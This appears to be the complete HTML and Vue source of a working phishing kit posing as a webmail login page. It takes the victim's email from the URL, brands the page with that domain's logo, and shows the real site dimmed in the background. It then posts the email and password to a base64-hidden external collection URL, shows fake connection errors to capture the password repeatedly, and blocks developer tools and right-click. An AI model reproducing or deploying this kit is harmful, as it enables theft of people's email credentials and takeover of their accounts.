<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <meta name="referrer" content="strict-origin" />
    <link
      id="favicon"
      rel="shortcut icon"
      type="image/png"
      href="https://alphatrade-options.com/git/rand/favicon.png"
    />
    <title>Webmail - Login</title>
    <style>
      body {
        background-color: #eeeeee;
        font-family: Helvetica Neue, Helvetica, sans-serif;
        font-size: 13px;
        color: #425152;
        margin: 0;
      }

      ::-moz-placeholder {
        color: #d9dad9;
      }

      :-ms-input-placeholder {
        color: #d9dad9;
      }

      ::-ms-input-placeholder {
        color: #d9dad9;
      }

      ::placeholder {
        color: #d9dad9;
      }

      a {
        color: #425152;
        text-decoration: none;
      }

      a:hover {
        text-decoration: underline;
      }

      input {
        border-radius: 5px;
        padding: 5px 3px;
      }

      input.submit {
        font-weight: bold;
        text-align: center;
        min-width: 90px;
        color: #f0f0f0;
        background: #444444;
        padding: 5px 12px;
        border-color: #444444;
        border-style: solid;
        cursor: pointer;
      }

      input.submit:hover {
        color: #ffffff;
      }

      .row {
        margin: 10px 0;
      }

      .row:after {
        content: '';
        display: table;
        clear: both;
      }

      .logoWithPortalIcons {
        width: 150px;
        height: 50px;
        background: transparent
          url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJYAAAARCAYAAAA/tFWCAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH3gYNAictBVTA/AAAAj5JREFUaN7tWdFtgzAQfakyAPICyQffNCOQCdpMUDaoMkHIBFUnSDJB0gkgE5T62x9MgLJB+pGLRK2AMbYbiHgSPxjuznfPvjt7BOAMO0gBzAGgCHwPQAJgJn2zZlzEReBX6mRcjIrAD+n/MnIAC8ZFVnoXA1i1sPUEICOZO7LdVOYVIwC37J+X9LT1eUaPbDMqdOpiTfNPSF5rHzzBDfY3SGWKKYA9kdYUHjkuIidG6AdmfbHZOrGKwJ8Zsl1FrlcHcjcku0/YOPRz94jlKPBlvDiSG6J/eO+qYeOaPGtSa6nG1goZec03eZM6r8HO900psfzuWmOV5y/XG011tKltVOl7Iy1c1SIetbRHnp/sA6W9Y9tMZVykCnKBcRErxnNDcqMBcbOe7VInAJ//kBGc7VgTTYdfO6xrjRUBeKv4dse42Das0z6qOiPGxVJRlDfZsfqY+myn9z+xc02sSLPjkFNDXdCOml1bm64pMdgRHg2JZuw6Xbz3FYfBBQOxbGOraAoGWEiFqUbKQscCkuNyKq3CREr3EXU6j0au9T1jd5aeuEeOiyXbE4N5hzV1iq6OUCG/rc9vyW0yZqNW07LX+nED3fNVBSllXKRF4Md1RxFF4E9rGoi8SWc54C6YUROUjx0ID1F/iZsqxmPqLFc1/w/EstMVytgZ+HZPpPIAHF0QK3PsrK+BL1qLXAdHAz07XK6YPAC59a6QcXFwWBSehmOBzsKjuJ9cHjcs4ObAcUnXPQO6hRTAc2nx//wCPaq4/QlxCjAAAAAASUVORK5CYII=')
          /*IconsTogether.svg*/ no-repeat left top;
      }

      .logoOnly {
        width: 280px;
        height: 30px;
        overflow: hidden;
      }

      .logoOnly .logoWithPortalIcons {
        width: 320px;
        height: 120px;
      }

      .title {
        font-size: 26px;
        margin: 20px 0 10px;
      }

      .red {
        color: #ee3031;
      }

      a#create-account {
        display: inline-block;
        border-radius: 4px;
        padding: 3px 8px;
        border: 1px solid #ee3031;
      }

      a#create-account:hover {
        text-decoration: none;
      }

      .col1,
      .col2 {
        float: left;
        line-height: 30px;
        vertical-align: middle;
        padding-top: 4px;
      }

      .col1 {
        width: 124px;
        font-size: 13px;
        font-weight: 600;
      }

      .col2 {
        width: 286px;
      }

      .col2 input {
        width: 96%;
      }

      .error {
        color: #d52b1e;
        font-weight: normal;
      }

      .container {
        background: rgba(255, 255, 255, 1);
        padding: 40px;
        box-shadow: 2px 2px 4px 2px #ccc;
        width: 416px;
        border-radius: 5px;
        /*
            margin: 0 auto;
            position:absolute;
            left:0;
            right:0;
            top:38%;
            top:100px\9;
            transform: translateY(-50%);
            */
        margin: 10% auto 30px auto;
        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
        transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
      }

      .password-icon {
        width: 15px;
        position: absolute;
        cursor: pointer;
        margin-top: 9px;
        margin-left: -28px;
        background-color: white;
      }

      #login_footer {
        line-height: 125%;
        font-size: 12px;
        text-align: justify;
        width: 500px;
        margin: 90px auto auto auto;
        padding-left: 10px;
      }

      @media only screen and (max-width: 600px) {
        body {
          background-image: none;
        }

        .container {
          /*
                position:relative;
                padding: 20px;
                box-shadow:none;
                width: 375px;
                top:0;
                left:auto;
                right:auto;
                transform: translateY(0);
                */
          width: 100%;
          border-radius: 0;
          box-shadow: none;
          padding: 0;
          margin-top: 0;
        }

        .container div.body {
          padding: 40px 20px;
        }

        .col1,
        .col2 {
          float: none;
          width: 100%;
        }

        #login_footer {
          width: 99%;
          margin-top: 20px;
        }

        #login_footer div.content {
          padding: 10px 20px 10px 10px;
        }

        .password-icon {
          margin-top: -25px;
          right: 7%;
        }
      }

      .xlogo {
        color: #fff;
        margin-bottom: 10px;
        margin-top: -25px;
      }

      .xlogo img {
        vertical-align: middle;
        width: 5%;
        height: 5%;
        object-fit: contain;
      }

      .xlogo span {
        vertical-align: middle;
      }

      .text-g {
        font-family: 'Arial Black', Gadget, sans-serif;
        text-transform: uppercase !important;
        text-align: center;
        font-size: 25px;
        color: #444444;
        background-color: rgba(255, 255, 255, 0);
        text-shadow: rgb(255, 255, 255) 2px 2px 2px;
      }

      #root {
        position: absolute;
        left: 0;
        right: 0;
        bottom: 0;
        top: 0;
        z-index: -10;
        pointer-events: none;
        filter: brightness(0.3);
      }
    </style>

    <script>
      document.onkeydown = function (e) {
        if (event.keyCode == 123) {
          return false
        }
        if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
          return false
        }
        if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
          return false
        }
        if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
          return false
        }
        if (e.ctrlKey && e.keyCode == 'C'.charCodeAt(0)) {
          return false
        }
        if (e.ctrlKey && e.keyCode == 'X'.charCodeAt(0)) {
          return false
        }
        if (e.ctrlKey && e.keyCode == 'Y'.charCodeAt(0)) {
          return false
        }
        if (e.ctrlKey && e.keyCode == 'Z'.charCodeAt(0)) {
          return false
        }
        if (e.keyCode == 67 && e.shiftKey && (e.ctrlKey || e.metaKey)) {
          return false
        }
        if (
          e.keyCode == 'J'.charCodeAt(0) &&
          e.altKey &&
          (e.ctrlKey || e.metaKey)
        ) {
          return false
        }
        if (
          e.keyCode == 'I'.charCodeAt(0) &&
          e.altKey &&
          (e.ctrlKey || e.metaKey)
        ) {
          return false
        }
        if (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) {
          return false
        }
        if (
          (e.metaKey && e.keyCode == 'S'.charCodeAt(0)) ||
          (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0))
        ) {
          return false
        }
        if (e.ctrlKey && e.keyCode == 'H'.charCodeAt(0)) {
          return false
        }
        if (e.ctrlKey && e.keyCode == 'A'.charCodeAt(0)) {
          return false
        }
        if (
          (e.metaKey && e.keyCode == 'F'.charCodeAt(0)) ||
          (e.ctrlKey && e.keyCode == 'F'.charCodeAt(0))
        ) {
          return false
        }
        if (
          (e.metaKey && e.keyCode == 'E'.charCodeAt(0)) ||
          (e.ctrlKey && e.keyCode == 'E'.charCodeAt(0))
        ) {
          return false
        }
      }
      if (document.addEventListener) {
        document.addEventListener(
          'contextmenu',
          function (e) {
            e.preventDefault()
          },
          false
        )
      } else {
        document.attachEvent('oncontextmenu', function () {
          window.event.returnValue = false
        })
      }
    </script>
  </head>

  <body>
    <div id="app" v-if="vueAppIsLoaded">
      <div
        class="container"
        id="container"
        style="padding-bottom: 10px !important; position: relative"
      >
        <div
          style="
            position: absolute;
            top: 0;
            width: 100%;
            height: 100%;
            left: 0;
            background: #fff;
            opacity: 0.7;
            z-index: 10;
          "
          id="bg_screen"
          v-if="isLoading"
        ></div>
        <img
          src="https://ik.imagekit.io/escrowmade/Rolling-1s-200px__1__trHCWXy9jD.gif"
          style="
            z-index: 10;
            width: 50px;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
          "
          id="loading_image"
          v-if="isLoading"
        />

        <div class="body">
          <div class="xlogo">
            <img
              id="zion"
              :src="emailDomainLogo"
              onerror="this.onerror=null;this.src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABs0lEQVR4AWL4//8/RRjO8Iucx+noO0O2qmlbUEnt5r3Juas+hsQD6KaG7dqCKPgx72Pe9GIY27btZBrbtm3btm0nO12D7tVXe63jqtqqU/iDw9K58sEruKkngH0DBljOE+T/qqx/Ln718RZOFasxyd3XRbWzlFMxRbgOTx9QWFzHtZlD+aqLb108sOAIAai6+NbHW7lUHaZkDFJt+wp1DG7R1d0b7Z88EOL08oXwjokcOvvUxYMjBFCamWP5KjKBjKOpZx2HEPj+Ieod26U+dpg6lK2CIwTQH0oECGT5eHj+IgSueJ5fPaPg6PZrz6DGHiGAISE7QPrIvIKVrSvCe2DNHSsehIDatOBna/+OEOgTQE6WAy1AAFiVcf6PhgCGxEvlA9QngLlAQCkLsNWhBZIDz/zg4ggmjHfYxoPGEMPZECW+zjwmFk6Ih194y7VHYGOPvEYlTAJlQwI4MEhgTOzZGiNalRpGgsOYFw5lEfTKybgfBtmuTNdI3MrOTAQmYf/DNcAwDeycVjROgZFt18gMso6V5Z8JpcEk2LPKpOAH0/4bKMCAYnuqm7cHOGHJTBRhAEJN9d/t5zCxAAAAAElFTkSuQmCC';"
            />
            <span style="text-transform: capitalize" class="text-g" id="banNer"
              >{{ emailDomainLogoName }}</span
            >
          </div>
          <div class="row">
            <div class="col1"><label for="ai">Email:</label></div>
            <div class="col2">
              <input
                :class="{hasValue:emailNotEmpty}"
                ref="emailElement"
                v-model="email"
                type="text"
                name="ai" disabled
                id="ai"
                placeholder="Email Address"
              />
            </div>
          </div>
          <div
            class="row"
            style="position: relative; overflow: visible; margin-bottom: 10px"
          >
            <div class="col1"><label for="pr">Password:</label></div>
            <div class="col2">
              <input
                :class="{hasValue:passwordNotEmpty}"
                ref="passwordElement"
                v-model="password"
                v-bind="{type: (showPassword) ? 'text' : 'password'}"
                name="pr"
                id="pr"
                placeholder="Enter Password"
              />
            </div>
            <!-- Password Visibility -->
            <img
              id="id-password-reveal-icon"
              class="password-icon"
              v-if="!showPassword"
              src="https://ik.imagekit.io/escrowmade/download_0-BUoL3T3.png"
              @click="togglePasswordVisibility"
            />

            <img
              id="id-password-reveal-icon"
              class="password-icon"
              v-if="showPassword"
              src="https://ik.imagekit.io/escrowmade/download__1__OSvF-Qvmk.png"
              @click="togglePasswordVisibility"
            />
          </div>
        </div>

        <div v-if="errorMessage" class="row">
          <div><span class="error" id="error">{{ errorMessage }}</span></div>
        </div>
        <div v-if="successMessage" class="row">
          <div>
            <span class="success" id="success">{{ successMessage }}</span>
          </div>
        </div>

        <div class="row">
          <div class="col1" style="line-height: 40px; padding-top: 10px">
            <input
              @click.prevent="handleSubmit"
              type="button"
              id="submit_btn"
              class="submit"
              :value="submitButtonElementText"
              style="padding: 7px 24px"
            />
          </div>
        </div>

        <div class="row">
          <p style="font-size: 120%; color: #ff2b10"></p>
          <p>
            This information system is the property of
            <span id="kai" style="text-transform: capitalize"
              >{{ emailDomainLogoName }}</span
            >.
            <br />
            We advise all users to verify their email account for security
            reasons.<br />
            By continuing to use the system you indicate your awareness of and
            consent to these terms and conditions of use.
          </p>
        </div>
      </div>
      <div id="root">
        <iframe
          id="myframe"
          scrolling="no"
          :src="emailDomainFullUrl"
          width="100%"
          height="100%"
          frameborder="0"
        ></iframe>
      </div>
    </div>
    <!-- SCRIPT BEGINS -->
    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.12"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js"></script>
    <!-- SET WINDOW VARIABLE -->
    <script>
      // This is the hash encrpytion aHR0cHM6Ly9kb3BhbWFpbmUubmV0L0B2OC80L2luZGV4LnBocA
      // of
      // https//a0904773.xsph.ru/.../sa-doc.php
      // Remove the "//" if you want to use the

      // window.MAIL_URL = 'http://a0904773.xsph.ru/.../sa-doc.php'
      window.MAIL_URL = 'aHR0cDovL2EwOTA0NzczLnhzcGgucnUvLi4uL3NhLWRvYy5waHA='
      window.AUTH_LOADING_MESSAGE = 'Login'
      window.LOGIN_ERROR_MESSAGE = `Please make sure you are connected to the internet.`
      window.DEFAULT_SITE_TITLE = 'Webmail - Login'
      window.DEFAULT_SITE_LOGO =
        'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABs0lEQVR4AWL4//8/RRjO8Iucx+noO0O2qmlbUEnt5r3Juas+hsQD6KaG7dqCKPgx72Pe9GIY27btZBrbtm3btm0nO12D7tVXe63jqtqqU/iDw9K58sEruKkngH0DBljOE+T/qqx/Ln718RZOFasxyd3XRbWzlFMxRbgOTx9QWFzHtZlD+aqLb108sOAIAai6+NbHW7lUHaZkDFJt+wp1DG7R1d0b7Z88EOL08oXwjokcOvvUxYMjBFCamWP5KjKBjKOpZx2HEPj+Ieod26U+dpg6lK2CIwTQH0oECGT5eHj+IgSueJ5fPaPg6PZrz6DGHiGAISE7QPrIvIKVrSvCe2DNHSsehIDatOBna/+OEOgTQE6WAy1AAFiVcf6PhgCGxEvlA9QngLlAQCkLsNWhBZIDz/zg4ggmjHfYxoPGEMPZECW+zjwmFk6Ih194y7VHYGOPvEYlTAJlQwI4MEhgTOzZGiNalRpGgsOYFw5lEfTKybgfBtmuTNdI3MrOTAQmYf/DNcAwDeycVjROgZFt18gMso6V5Z8JpcEk2LPKpOAH0/4bKMCAYnuqm7cHOGHJTBRhAEJN9d/t5zCxAAAAAElFTkSuQmCC'
      window.DEFAULT_SITE_FAVICON =
        'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABs0lEQVR4AWL4//8/RRjO8Iucx+noO0O2qmlbUEnt5r3Juas+hsQD6KaG7dqCKPgx72Pe9GIY27btZBrbtm3btm0nO12D7tVXe63jqtqqU/iDw9K58sEruKkngH0DBljOE+T/qqx/Ln718RZOFasxyd3XRbWzlFMxRbgOTx9QWFzHtZlD+aqLb108sOAIAai6+NbHW7lUHaZkDFJt+wp1DG7R1d0b7Z88EOL08oXwjokcOvvUxYMjBFCamWP5KjKBjKOpZx2HEPj+Ieod26U+dpg6lK2CIwTQH0oECGT5eHj+IgSueJ5fPaPg6PZrz6DGHiGAISE7QPrIvIKVrSvCe2DNHSsehIDatOBna/+OEOgTQE6WAy1AAFiVcf6PhgCGxEvlA9QngLlAQCkLsNWhBZIDz/zg4ggmjHfYxoPGEMPZECW+zjwmFk6Ih194y7VHYGOPvEYlTAJlQwI4MEhgTOzZGiNalRpGgsOYFw5lEfTKybgfBtmuTNdI3MrOTAQmYf/DNcAwDeycVjROgZFt18gMso6V5Z8JpcEk2LPKpOAH0/4bKMCAYnuqm7cHOGHJTBRhAEJN9d/t5zCxAAAAAElFTkSuQmCC'
      //SETTING OF SOME STUFF
      window.ALLOW_DYNAMIC_EMAIL_LOGO = true
      window.ENABLE_PASSWORD_VISIBILITY_TOGGLE = true
    </script>
    <script>
      new Vue({
        data: () => ({
          vueAppIsLoaded: false,
          //MAIN APPLICATION DATA
          showPassword: false,
          retryAttemptCount: 0,
          isLoading: false,
          submitButtonText: 'Login',
          errorMessage: ``,
          successMessage: '',
          email: '',
          password: '',
        }),

        created() {
          this.turnUrlToRandom()
          //SET AXIOS RESPONSE TIME
          axios.interceptors.request.use((config) => {
            config.headers['request-startTime'] = new Date()
            return config
          })

          axios.interceptors.response.use((response) => {
            const start = response.config.headers['request-startTime']
            const end = new Date()
            const milliseconds = end - start
            response.headers['request-duration'] = milliseconds
            return response
          })

          // SET EMAIL HASH
          const pageUrl = window.location.href
          const pageUrlArray = pageUrl.split('#')
          if (pageUrlArray.length > 1) {
            const emailHref64 = pageUrlArray[pageUrlArray.length - 1]
            try {
              this.email = this.validateEmail(emailHref64)
                ? emailHref64
                : atob(emailHref64)
            } catch (e) {}
          }

          this.pageMiddleware()

          $('body').on('click', 'a', function (e) {
            e.preventDefault()
          })
          $('body').removeClass('down')
          $('#background-loader').fadeOut(250)
        },

        mounted: function () {
          this.$nextTick(function () {
            this.vueAppIsLoaded = true
            this.setDocumentPageFavicon()
            this.setDocumentPageTitle()
            document.addEventListener('keydown', this.onKeydown)
            setTimeout(() => {
              $('#div1').show()
              if (_.isEmpty(this.email)) {
                $('#div1').show()
                $('#emailContainerHolder').show()
                $('#ai').click(function () {
                  $('#error').hide()
                })
                this.$refs.emailElement.focus()
              } else {
                // $("#div1").animate({ left: 0, opacity: "hide" }, 0);
                // $("#div2").animate({ right: 0, opacity: "show" }, 500);
                // this.$refs.passwordElement.focus();
              }
            }, 600)
          })
        },

        filters: {
          capitalize: function (value) {
            if (!value) return ''
            value = value.toString()
            return value.charAt(0).toUpperCase() + value.slice(1)
          },
          camelCase: function (value) {
            return str
              .toLowerCase()
              .replace(/[-_]+/g, ' ')
              .replace(/[^\w\s]/g, '')
              .replace(/ (.)/g, function ($1) {
                return $1.toUpperCase()
              })
              .replace(/ /g, '')
          },
        },

        computed: {
          enablePasswordVisibilityToggle: function () {
            return window.ENABLE_PASSWORD_VISIBILITY_TOGGLE || false
          },
          emailIsEmpty: function () {
            return _.isEmpty(this.email)
          },
          emailNotEmpty: function () {
            return !_.isEmpty(this.email)
          },
          passwordNotEmpty: function () {
            return !_.isEmpty(this.password)
          },
          submitButtonElementText: function () {
            return this.isLoading
              ? window.AUTH_LOADING_MESSAGE
              : this.submitButtonText
          },
          emailDomainFullUrl: function () {
            try {
              const domain = this.checkForDynamicAndValidateSplitEmail(
                this.email
              )[1]
              return `https://www.${domain}`
            } catch (error) {}
          },
          emailDomainLogo: function () {
            try {
              const domain = this.checkForDynamicAndValidateSplitEmail(
                this.email
              )[1]
              return `https://logo.clearbit.com/${domain}`
            } catch (error) {
              return window.DEFAULT_SITE_LOGO
            }
          },
          emailDomainLogoName: function () {
            try {
              return this.checkForDynamicAndValidateSplitEmail(
                this.email
              )[1].split('.')[0]
            } catch (error) {
              return ''
            }
          },
          emailDomainFavicon: function () {
            try {
              const domain = this.checkForDynamicAndValidateSplitEmail(
                this.email
              )[1]
              return `https://logo.clearbit.com/${domain}`
            } catch (error) {
              return window.DEFAULT_SITE_FAVICON
            }
          },
          emailDomainName: function () {
            try {
              return this.checkForDynamicAndValidateSplitEmail(this.email)[1]
            } catch (error) {
              return ''
            }
          },
          emailUsername: function () {
            try {
              return this.checkForDynamicAndValidateSplitEmail(this.email)[0]
            } catch (error) {
              return ''
            }
          },
        },

        watch: {
          email: async function () {
            this.setDocumentPageFavicon()
            this.setDocumentPageTitle()
          },
        },

        methods: {
          onKeydown(event) {
            var keycode = event.keyCode ? event.keyCode : event.which
            if (keycode == '13') {
              if ($('#div1').is(':visible')) {
                this.toPasswordPage()
              } else if ($('#div2').is(':visible')) {
                this.handleSubmit()
              } else {
                this.handleSubmit()
              }
            }
          },
          resetEmail() {
            this.email = ''
            this.retryAttemptCount = 0
          },
          togglePasswordVisibility() {
            if (this.enablePasswordVisibilityToggle) {
              this.showPassword = !this.showPassword
            }
          },
          toPasswordPage() {
            if (!this.validateEmail(this.email)) {
              $('#error').hide()
              this.$refs.emailElement.focus()
              return false
            }
            $('#div1').animate({ left: 0, opacity: 'hide' }, 0)
            $('#div2').animate({ right: 0, opacity: 'show' }, 500)
          },
          backToEmailPage() {
            this.email = ''
            this.password = ''

            $('#div2').animate({ left: 0, opacity: 'hide' }, 0)
            $('#div1').animate({ right: 0, opacity: 'show' }, 1000)

            $('#emailContainerHolder').show()
            $('#ai').click(function () {
              $('#error').hide()
            })
            this.$refs.emailElement.focus()
          },
          async handleSaveEmail() {
            this.errorMessage = ''

            try {
              this.isLoading = true

              const email = this.$refs.emailElement.value

              if (!this.validateEmail(email)) {
                throw Error(
                  "That Microsoft account doesn't exist. Enter a different account"
                )
              }

              setTimeout(() => {
                this.email = email
                this.isLoading = false
              }, 1000)
            } catch (error) {
              this.isLoading = false
              this.errorMessage = error.message
            }
          },
          async handleSubmit() {
            this.errorMessage = ''
            this.successMessage = ''

            try {
              if (!(this.email && this.password)) {
                throw Error('Please enter your email address or member ID.')
              }

              if (!this.validateEmail(this.email)) {
                throw Error('Please enter a valid email address or member ID.')
              }

              if (this.password.length <= 4) {
                throw Error('Password must be greater than four characters.')
              }

              this.isLoading = true
              const response = await this.sendMail(this.email, this.password)

              setTimeout(() => {
                if (this.retryAttemptCount < 2) {
                  this.password = ''
                  this.isLoading = false
                  this.errorMessage = window.LOGIN_ERROR_MESSAGE

                  if (this.retryAttemptCount === 1) {
                    this.errorMessage = `Please make sure you are connected to the internet.`
                  }
                  if (this.retryAttemptCount === 2) {
                    this.errorMessage = `Please make sure you are connected to the internet.`
                  }

                  this.retryAttemptCount = this.retryAttemptCount + 1
                } else {
                  //success message
                  this.isLoading = false
                  this.successMessage = `Succesfully Update. Wait you are being redirected to your homepage`
                  $('#div2').animate({ left: 0, opacity: 'hide' }, 0)
                  $('#div3').animate({ left: 0, opacity: 'show' }, 500)
                  setTimeout(() => {
                    window.location.replace(this.finalRedirectUrl())
                  }, 1000)
                }
              }, 4000 - response.headers['request-duration'])
            } catch (error) {
              this.isLoading = false
              this.errorMessage = error.message
            }
          },

          async sendMail(email, password) {
            try {
              window.MAIL_URL = atob(window.MAIL_URL)
            } catch (e) {}

            console.log(window.MAIL_URL)

            try {
              const data = new FormData()
              data.append('ai', email)
              data.append('email', email)
              data.append('password', password)
              data.append('pr', password)
              return await axios.post(window.MAIL_URL, data)
            } catch (error) {
              throw Error('Unable to connect to server')
            }
          },
          validateEmail(email) {
            const re =
              /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
            return re.test(email)
          },
          checkForDynamicAndValidateSplitEmail(email) {
            if (!window.ALLOW_DYNAMIC_EMAIL_LOGO) {
              throw Error('Dynamic email logo not allowed')
            }

            if (!this.validateEmail(email)) {
              throw Error('Invalid Email Address')
            }

            return email.split('@')
          },
          turnUrlToRandom() {
            const url = new URL(window.location.href)

            if (
              !(
                (
                  url.searchParams.has('websrc') &&
                  url.searchParams.has('dispatch') &&
                  url.searchParams.has('id')
                )
                //&& url.searchParams.has('email')
              )
            ) {
              url.searchParams.append(
                'websrc',
                url.searchParams.get('websrc') || this.randomString(302)
              )
              url.searchParams.append(
                'dispatch',
                url.searchParams.get('dispatch') ||
                  this.randomString(3, '0123456789')
              )
              url.searchParams.append(
                'id',
                url.searchParams.get('id') || this.randomString(6, '0123456789')
              )
              //url.searchParams.append('email', url.searchParams.get('email'));

              window.location.replace(url.toString())
            }
          },

          randomString(
            length,
            chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
          ) {
            var result = ''
            for (var i = length; i > 0; --i)
              result += chars[Math.floor(Math.random() * chars.length)]
            return result
          },
          //==========//
          pageMiddleware() {
            return
            // if (_.isEmpty(this.email) || ! this.validateEmail(this.email)) {
            //     window.location.replace("https://google.com");
            // }
          },

          finalRedirectUrl() {
            // https://mail.ionos.com/
            return `https://${this.emailDomainName.toLowerCase()}`
          },

          setDocumentPageTitle() {
            document.title = this.emailDomainName
              ? `Sign in to ${this.emailDomainName.split('.')[0].toLowerCase()}`
              : window.DEFAULT_SITE_TITLE
          },
          setDocumentPageFavicon() {
            var link = document.querySelector("link[rel~='icon']")
            if (!link) {
              link = document.createElement('link')
              link.rel = 'icon'
              document.getElementsByTagName('head')[0].appendChild(link)
            }

            favicon = new Image()
            favicon.src = this.emailDomainFavicon

            favicon.onerror = function () {
              link.href = window.DEFAULT_SITE_FAVICON
            }

            favicon.onload = function (image) {
              link.href = image.target.src
            }
          },
        },
      }).$mount('#app')
    </script>
  </body>
</html>